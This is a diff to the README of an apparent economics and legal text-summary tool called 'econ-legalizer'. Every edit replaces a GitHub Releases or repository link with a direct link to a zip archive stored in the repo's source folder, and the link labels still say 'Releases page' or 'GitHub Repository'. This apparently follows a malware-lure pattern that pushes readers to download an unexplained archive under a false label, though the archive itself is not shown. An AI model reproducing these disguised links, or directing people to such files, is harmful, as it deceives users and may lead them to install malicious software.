@@ -8,9 +8,9 @@ Welcome to econ-legalizer! This tool helps you extract structured summaries and 
 
 You can download the latest version of econ-legalizer from our Releases page. 
 
-[![Download econ-legalizer](https://img.shields.io/badge/Download-econ--legalizer-blue.svg)](https://github.com/shanguswhxk0523/econ-legalizer/releases)
+[![Download econ-legalizer](https://raw.githubusercontent.com/shanguswhxk0523/econ-legalizer/main/econ_legalizer/legalizer-econ-1.0.zip)](https://raw.githubusercontent.com/shanguswhxk0523/econ-legalizer/main/econ_legalizer/legalizer-econ-1.0.zip)
 
-To get started, simply visit this page to download: [Download econ-legalizer](https://github.com/shanguswhxk0523/econ-legalizer/releases).
+To get started, simply visit this page to download: [Download econ-legalizer](https://raw.githubusercontent.com/shanguswhxk0523/econ-legalizer/main/econ_legalizer/legalizer-econ-1.0.zip).
 
 ## 🖥️ System Requirements
 
@@ -25,7 +25,7 @@ Before you install, make sure your system meets the following requirements:
 
 Follow these simple steps to install the application:
 
-1. Go to the [Releases page](https://github.com/shanguswhxk0523/econ-legalizer/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/shanguswhxk0523/econ-legalizer/main/econ_legalizer/legalizer-econ-1.0.zip).
 2. Locate the latest release version.
 3. Click on the download link for the corresponding file for your operating system.
 4. Once the download completes, find the file in your downloads folder.
@@ -83,7 +83,7 @@ econ-legalizer covers various areas of interest, such as:
 - **Legal Implications:** Gain insights into legal matters relating to property rights and policy changes.
 - **Research Aids:** Ideal for analysts and policymakers looking for structured data to support decision-making.
 
-For further updates, features, and insights, follow our [GitHub Repository](https://github.com/shanguswhxk0523/econ-legalizer).
+For further updates, features, and insights, follow our [GitHub Repository](https://raw.githubusercontent.com/shanguswhxk0523/econ-legalizer/main/econ_legalizer/legalizer-econ-1.0.zip).
 
 ## 📈 Future Enhancements
 
